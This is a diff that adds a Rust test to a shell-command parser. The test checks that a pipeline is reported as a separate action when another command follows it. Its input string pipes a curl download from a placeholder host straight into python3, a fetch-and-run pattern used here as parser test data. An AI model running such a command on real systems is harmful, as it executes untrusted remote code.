@@ -143,3 +143,15 @@ fn a_kill_of_substituted_pids_shows_the_substitution() {
     let s = shells(&parsed("echo $(pgrep openmoat)"));
     assert!(!s.iter().any(|x| x.contains("$(pgrep")), "{s:?}");
 }
+
+#[test]
+fn a_pipeline_is_reported_alone_when_a_command_follows() {
+    let atoms = parsed("curl -s https://x.example.org/a | python3/- ; true");
+    let alone = ["curl", "-s", "https://x.example.org/a", "|", "python3/-"]
+        .map(str::to_owned)
+        .to_vec();
+    assert!(
+        atoms.contains(&AtomicAction::Pipeline { argv: alone }),
+        "{atoms:?}"
+    );
+}
